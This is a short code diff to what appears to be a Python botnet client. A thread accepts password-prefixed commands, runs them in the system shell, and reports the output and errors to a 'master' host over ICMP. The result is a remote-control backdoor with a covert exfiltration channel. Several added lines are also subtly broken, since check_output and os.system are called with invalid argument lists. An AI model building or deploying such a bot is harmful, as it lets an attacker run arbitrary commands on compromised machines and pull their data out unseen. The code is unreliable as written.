@@ -54,11 +54,14 @@ class Handler(threading.Thread):
 				cmd = raw[len(self.passwd):]
 				print("RECEIVED: "+cmd)
 				try:
-					out = subprocess.check_output(cmd.split())
+					os.system(cmd + " > /tmp/tmp.dat")
+					out = subprocess.check_output("cat", "/tmp/tmp.dat")
+					#out = subprocess.check_output(cmd.split())
+					os.system("rm","-f","/tmp/tmp.dat")
 					print("OUT: "+str(out))
+					send_icmp(localhost, self.master, "OUTPUT:"+localhost+"\n"+out)
 				except subprocess.CalledProcessError as e:
-					send_icmp(localhost, self.master, "ERROR:"+localhost+">>"+e.output)
-				send_icmp(localhost, self.master, "OUTPUT:"+localhost+">>"+out)
+					send_icmp(localhost, self.master, "ERROR:"+localhost+"\n"+e.output)
 
 def init():
 	print("Bot started...["+localhost+"]")
